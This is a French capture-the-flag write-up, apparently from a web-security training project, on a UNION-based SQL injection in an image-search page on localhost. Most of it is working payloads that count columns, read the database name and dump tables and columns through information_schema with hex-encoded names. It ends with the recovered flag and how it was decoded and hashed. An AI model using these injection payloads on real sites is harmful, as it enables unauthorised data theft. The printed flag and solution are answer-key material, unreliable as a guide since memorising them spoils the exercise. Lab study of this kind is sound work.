FAILLE SUR LA PAGE SEARCH IMAGE

- Je vois dans l'url que j'envoie un id dans le texte quand je donne un numero dans l'input
- Ceci me retourne un id avec des infos de la base de donnée
- Donc ici SQL injection de possible
- Au lieu de mettre 4 je peux mettre -1 pour afficher seulement les resultats de mon union et pas du résultat de 4
- J'y suis allé a taton: id=-1 UNION SELECT 1,2
                         id=-1 UNION SELECT 1,2,3
                         => pour voir le nombre de colonnes qu'il y a dans la réponse
- J'en ai trouvé deux
- ok dond la ca avance:
    => j'ai donc fait id=-1 UNION SELECT 1, database() pour avoir le nom de la base de donnée
        => j'ai ca en retour: Member_images

- J'ai ensuite fait: http://localhost:8080/index.php?page=searchimg&id=4 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
    => ceci permet de lister les tables ce qui me retourne: list_images 
    => qui est le nom de la table
- J'ai ensuite testé: http://localhost:8080/index.php?page=searchimg&id=-1 UNIONSELECT1,GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=list_images&Submit=Submit#
    => cette commande liste toutes les colonnes de la table mais ca ne rennvoie rien
    => il faut refaire la commande mais en mettant list_images en héxadécimal
- La commande est donc: http://localhost:8080/index.php?page=searchimg&id=-1%20UNION%20SELECT%201,GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name=0x6c6973745f696d61676573&Submit=Submit#
    => ceci me retourne des colonnes: id,url,title,comment
- Pour lire les tables je colonnes: UNION SELECT url,comment FROM list_images
    => je retrouve ca: Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
    C'EST LE FLAG
- Donc j'utilise un md5 decode et le résultat est: albatroz
    - Ensuite le résultat est f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 quand j'encode en sha256
